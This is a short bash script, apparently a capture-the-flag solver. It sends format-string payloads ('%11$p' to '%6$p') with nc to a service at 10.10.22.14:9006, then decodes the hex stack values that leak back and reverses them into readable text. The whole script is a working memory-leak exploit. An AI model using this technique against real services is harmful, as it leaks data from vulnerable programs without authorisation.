#!/bin/bash
(for i in {11..6..-1}; do echo \%$i\$p | nc 10.10.22.14 9006; done) | grep Thanks | cut -c 8- | xxd -ps -r | rev
